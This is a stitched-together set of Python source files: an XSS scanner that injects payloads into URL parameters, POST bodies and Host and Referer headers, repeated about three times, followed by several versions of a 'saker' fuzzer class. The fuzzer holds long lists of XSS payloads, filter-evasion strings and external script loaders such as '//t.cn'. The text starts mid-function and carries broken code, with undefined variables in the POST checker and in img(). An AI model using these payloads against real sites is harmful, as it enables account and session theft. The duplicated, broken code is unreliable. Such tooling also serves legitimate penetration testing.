        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, "GET", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print "%s[{0}] {1} is vulnerable to XSS via referer header%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting via referer header", "impact": impact, "req_headers": temp_headers, "req_body":body, "res_headers": ref_header_xss.headers ,"res_body": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+"://"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,"GET",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request_url.headers ,"res_body": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,"GET",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request_url.headers ,"res_body": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info("GET param for xss : %s",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+"://"+parsed_url.netloc+parsed_url.path+"/?"+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,"GET",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info("%s is vulnerable to XSS",url)
                            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { "id" : 11, "scanid" : scanid, "url" : xss_url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info("XSS: No GET param found!")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({"scanid": scanid}, {"$set" : {"scan_data" : vul_param+" parameters are vulnerable to XSS"}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)

import os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print "response header",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = "Low"
        else:
            impact = "High"
    else:
        impact = "Low"

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print "updated body",temp_body
            xss_post_request = req.api_request(url, "POST", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post_request.headers)
                if db_update is not True:
                    attack_result = { "id" : 11, "scanid" : scanid, "url" : xss_url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({"scanid": scanid}, {"$set" : {"scan_data" : post_vul_param+" are vulnerable to XSS"}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {"Host" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, "GET", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = "Low"
            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": host_header_xss.headers ,"res_body": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload                    
        referer_header = {"Referer" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, "GET", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print "%s[{0}] {1} is vulnerable to XSS via referer header%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting via referer header", "impact": impact, "req_headers": temp_headers, "req_body":body, "res_headers": ref_header_xss.headers ,"res_body": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+"://"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,"GET",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request_url.headers ,"res_body": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,"GET",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request_url.headers ,"res_body": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info("GET param for xss : %s",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+"://"+parsed_url.netloc+parsed_url.path+"/?"+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,"GET",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info("%s is vulnerable to XSS",url)
                            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { "id" : 11, "scanid" : scanid, "url" : xss_url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info("XSS: No GET param found!")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({"scanid": scanid}, {"$set" : {"scan_data" : vul_param+" parameters are vulnerable to XSS"}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)

import os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print "response header",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = "Low"
        else:
            impact = "High"
    else:
        impact = "Low"

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print "updated body",temp_body
            xss_post_request = req.api_request(url, "POST", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post_request.headers)
                if db_update is not True:
                    attack_result = { "id" : 11, "scanid" : scanid, "url" : xss_url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({"scanid": scanid}, {"$set" : {"scan_data" : post_vul_param+" are vulnerable to XSS"}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {"Host" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, "GET", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = "Low"
            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": host_header_xss.headers ,"res_body": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload                    
        referer_header = {"Referer" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, "GET", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print "%s[{0}] {1} is vulnerable to XSS via referer header%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting via referer header", "impact": impact, "req_headers": temp_headers, "req_body":body, "res_headers": ref_header_xss.headers ,"res_body": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+"://"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,"GET",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request_url.headers ,"res_body": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,"GET",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request_url.headers ,"res_body": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info("GET param for xss : %s",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+"://"+parsed_url.netloc+parsed_url.path+"/?"+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,"GET",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info("%s is vulnerable to XSS",url)
                            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { "id" : 11, "scanid" : scanid, "url" : xss_url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info("XSS: No GET param found!")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({"scanid": scanid}, {"$set" : {"scan_data" : vul_param+" parameters are vulnerable to XSS"}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)

#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """generate XSS payload"""

    def __init__(self, url=""):
        """
        url: xss payload url
        """
        super(XSS, self).__init__()
        self.url = url

    @staticmethod
    def alterTest(self, p=False):
        return "<script>alert(/xss/)</script>"

    def img(self):
        payload = "<img src='%s'></img>" % self.url                    
        return payload                    

    def script(self):
        payload = "<script src='%s'></script>" % self.url
        return payload                    

    def event(self, element, src, event, js):
        payload = "<%s src=" % element
        payload += '"%s" ' % src
        payload += event
        payload += "=%s >" % js
        return payload                    

    def cspBypass(self):
        return "<link rel='preload' href='%s'>" % self.url

#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class XSS(Fuzzer):

    """generate XSS payload"""

    def __init__(self, url=""):
        """
        url: xss payload url
        """
        super(XSS, self).__init__()
        self.url = url

    @staticmethod                    
    def alterTest(self, p=False):
        return "<script>alert(/xss/)</script>"

    def img(self):                    
        return '<img/onerror="%s"/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload="%s"/>' % payload

    def style(self, payload):
        return '<style/onload="%s"></style>' % payload

    def input(self, payload):
        return '<input/onfocus="%s"/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart="%s"></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel="%s"/style="height:200%;width:100%"></div>' % payload

    def script(self):
        payload = "<script src='%s'></script>" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = "<%s src=" % element
        payload += '"%s" ' % src
        payload += event
        payload += "=%s >" % js
        return payload

    def cspBypass(self):
        return "<link rel='preload' href='%s'>" % self.url

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
import string
from urllib import quote                    
from saker.fuzzers.fuzzer import Fuzzer


class Code(Fuzzer):

    """Code Payload"""

    homograph = {
        'a': '\u0430',
        'c': '\u03F2',
        'd': '\u0501',
        'e': '\u0435',
        'h': '\u04BB',
        'i': '\u0456',
        'j': '\u0458',
        'l': '\u04CF',
        'o': '\u043E',
        'p': '\u0440',
        'r': '\u0433',
        'q': '\u051B',
        's': '\u0455',
        'w': '\u051D',
        'x': '\u0445',
        'y': '\u0443',
    }

    def __init__(self):
        super(Code, self).__init__()

    @staticmethod
    def fuzzAscii():
        for i in xrange(256):
            yield chr(i)

    @staticmethod
    def fuzzUnicode(cnt=1):
        for i in xrange(cnt):
            yield unichr(random.randint(0, 0xffff))

    @staticmethod
    def fuzzUnicodeReplace(s, cnt=1):
        # Greek letter
        s = s.replace("A", "Ā", cnt)
        s = s.replace("A", "Ă", cnt)
        s = s.replace("A", "Ą", cnt)
        s = s.replace("a", "α", cnt)
        # Russian letter 1-4
        s = s.replace("e", "е", cnt)
        s = s.replace("a", "а", cnt)
        s = s.replace("e", "ё", cnt)
        s = s.replace("o", "о", cnt)
        return s

    @staticmethod
    def fuzzErrorUnicode(s):
        # https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html
        return s + chr(random.randint(0xC2, 0xef))

    @staticmethod
    def urlencode(s, force=False):
        if not force:
            s = quote(s)
        else:
            s = map(lambda i: hex(ord(i)).replace("0x", "%"), s)
            s = "".join(s)
        return s

#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_tags = [
    'a',
    'abbr',
    'acronym',
    'address',
    'applet',
    'area',
    'article',
    'aside',
    'audio',
    'b',
    'base',
    'basefont',
    'bdi',
    'bdo',
    'bgsound',
    'big',
    'blink',
    'blockquote',
    'body',
    'br',
    'button',
    'canvas',
    'caption',
    'center',
    'cite',
    'code',
    'col',
    'colgroup',
    'command',
    'content',
    'data',
    'datalist',
    'dd',
    'del',
    'details',
    'dfn',
    'dialog',
    'dir',
    'div',
    'dl',
    'dt',
    'element',
    'em',
    'embed',
    'fieldset',
    'figcaption',
    'figure',
    'font',
    'footer',
    'form',
    'frame',
    'frameset',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'head',
    'header',
    'hgroup',
    'hr',
    'html',
    'i',
    'iframe',
    'image',
    'img',
    'input',
    'ins',
    'isindex',
    'kbd',
    'keygen',
    'label',
    'layer',
    'legend',
    'li',
    'link',
    'listing',
    'main',
    'map',
    'mark',
    'marquee',
    'menu',
    'menuitem',
    'meta',
    'meter',
    'multicol',
    'nav',
    'nobr',
    'noembed',
    'noframes',
    'nolayer',
    'noscript',
    'object',
    'ol',
    'optgroup',
    'option',
    'output',
    'p',
    'param',
    'picture',
    # 'plaintext',
    'pre',
    'progress',
    'q',
    'rp',
    'rt',
    'rtc',
    'ruby',
    's',
    'samp',
    'script',
    'section',
    'select',
    'shadow',
    'small',
    'source',
    'spacer',
    'span',
    'strike',
    'strong',
    'style',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'template',
    'textarea',
    'tfoot',
    'th',
    'thead',
    'time',
    'title',
    'tr',
    'track',
    'tt',
    'u',
    'ul',
    'var',
    'video',
    'wbr',
    'xmp',
]

_events = [
    'onabort',
    'onautocomplete',
    'onautocompleteerror',
    'onafterscriptexecute',
    'onanimationend',
    'onanimationiteration',
    'onanimationstart',
    'onbeforecopy',
    'onbeforecut',
    'onbeforeload',
    'onbeforepaste',
    'onbeforescriptexecute',
    'onbeforeunload',
    'onbegin',
    'onblur',
    'oncanplay',
    'oncanplaythrough',
    'onchange',
    'onclick',
    'oncontextmenu',
    'oncopy',
    'oncut',
    'ondblclick',
    'ondrag',
    'ondragend',
    'ondragenter',
    'ondragleave',
    'ondragover',
    'ondragstart',
    'ondrop',
    'ondurationchange',
    'onend',
    'onemptied',
    'onended',
    'onerror',
    'onfocus',
    'onfocusin',
    'onfocusout',
    'onhashchange',
    'oninput',
    'oninvalid',
    'onkeydown',
    'onkeypress',
    'onkeyup',
    'onload',
    'onloadeddata',
    'onloadedmetadata',
    'onloadstart',
    'onmessage',
    'onmousedown',
    'onmouseenter',
    'onmouseleave',
    'onmousemove',
    'onmouseout',
    'onmouseover',
    'onmouseup',
    'onmousewheel',
    'onoffline',
    'ononline',
    'onorientationchange',
    'onpagehide',
    'onpageshow',
    'onpaste',
    'onpause',
    'onplay',
    'onplaying',
    'onpopstate',
    'onprogress',
    'onratechange',
    'onreset',
    'onresize',
    'onscroll',
    'onsearch',
    'onseeked',
    'onseeking',
    'onselect',
    'onselectionchange',
    'onselectstart',
    'onstalled',
    'onstorage',
    'onsubmit',
    'onsuspend',
    'ontimeupdate',
    'ontoggle',
    'ontouchcancel',
    'ontouchend',
    'ontouchmove',
    'ontouchstart',
    'ontransitionend',
    'onunload',
    'onvolumechange',
    'onwaiting',
    'onwebkitanimationend',
    'onwebkitanimationiteration',
    'onwebkitanimationstart',
    'onwebkitfullscreenchange',
    'onwebkitfullscreenerror',
    'onwebkitkeyadded',
    'onwebkitkeyerror',
    'onwebkitkeymessage',
    'onwebkitneedkey',
    'onwebkitsourceclose',
    'onwebkitsourceended',
    'onwebkitsourceopen',
    'onwebkitspeechchange',
    'onwebkittransitionend',
    'onwheel'
]

_htmlTemplate = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Fuzzer</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body>
%s
</body>
</html>
'''

# probe for test xss vuln
_probes = [
    """'';!--"<XSS>=&{()}""",
]

# xss payloads
_payloads = [
    '<q/oncut=open()>',
    '<svg/onload=eval(name)>',
    '<img src=x onerror=alert(/xss/)>',
    """<img src="javascript:alert('xss');">""",
    """<style>@im\\port'\\ja\\vasc\\ript:alert("xss")';</style>""",
    """<img style="xss:expr/*xss*/ession(alert('xss'))"> """,
    """<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">""",
    """<meta http-equiv="refresh" content="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">""",
    """<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-""",                    
]

# payload for waf test
_waf_payloads = [
    "<IMG SRC=JaVaScRiPt:alert('xss')>",
    '<<script>alert("xss");//<</script>',
    """<img src="javascript:alert('xss')" """,
    '<a href="javascript%26colon;alert(1)">click',
    '<a href=javas&#99;ript:alert(1)>click',
    '<--`<img/src=` onerror=confirm``> --!>',
    '\'"</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//t.cn>',
    '<embed//sRc=//t.cn>',
    '<base href=//t.cn/><script src=/>',
    '<object//data=//t.cn>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
    '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>'
]

# payload with html 5 features
# http://html5sec.org
_h5payloads = [
    '<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',
    '<video><source onerror="alert(1)">',
    '<video onerror="alert(1)"><source></source></video>',
    '<form><button formaction="javascript:alert(1)">X</button>',
    '<math href="javascript:alert(1)">CLICKME</math>',
    '<link rel="import" href="test.svg" />',
    '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />',
]


class XSS(Fuzzer):

    """generate XSS payload"""

    tags = _tags
    events = _events
    htmlTemplate = _htmlTemplate
    probes = _probes
    payloads = _payloads
    waf_payloads = _waf_payloads
    h5payloads = _h5payloads

    def __init__(self, url=""):
        """
        url: xss payload url
        """
        super(XSS, self).__init__()
        self.url = url

    @classmethod
    def alterTest(cls, p=False):
        return "<script>alert(/xss/)</script>"

    @classmethod
    def genTestHTML(cls):
        s = ''
        for t in cls.tags:
            s += '<%s src="x"' % t
            for e in cls.events:
                s += ''' %s="console.log('%s %s')" ''' % (e, t, e)
            s += '>%s</%s>\n' % (t, t)
        return cls.htmlTemplate % s

    @classmethod
    def acmehttp01(cls, url):
        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/
        return url + '/.well-known/acme-challenge/?<h1>hi'

    def img(self, payload):
        return '<img/onerror="%s"/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload="%s"/>' % payload

    def style(self, payload):
        return '<style/onload="%s"></style>' % payload

    def input(self, payload):
        return '<input/onfocus="%s"/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart="%s"></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel="%s"/style="height:200%;width:100%"></div>' % payload

